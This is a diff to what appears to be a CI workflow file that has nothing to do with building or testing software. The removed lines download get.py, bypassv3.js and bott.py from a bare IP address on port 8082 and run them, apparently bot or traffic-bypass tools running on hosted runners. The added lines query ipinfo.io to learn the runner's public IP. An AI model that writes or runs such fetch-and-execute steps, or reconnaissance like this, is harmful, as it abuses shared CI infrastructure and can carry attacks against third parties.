@@ -16,21 +16,7 @@ jobs:
     - name: Install system dependencies
       run: |
         sudo apt update
-        sudo apt install -y wget python3 npm nodejs python3-pip
+        sudo apt install -y wget curl
+        curl ipinfo.io
 
-    - name: Install Python dependencies
-      run: pip install psutil
-
-    - name: Install Node.js dependencies
-      run: npm install socks hpack chalk@2
-
-    - name: Download required files
-      run: |
-        wget -q http://38.242.224.156:8082/get.py
-        wget -q http://38.242.224.156:8082/bypassv3.js
-        wget -q http://38.242.224.156:8082/bott.py
-
-    - name: Execute scripts
-      run: |
-        python3 get.py
-        python3 bott.py
+    
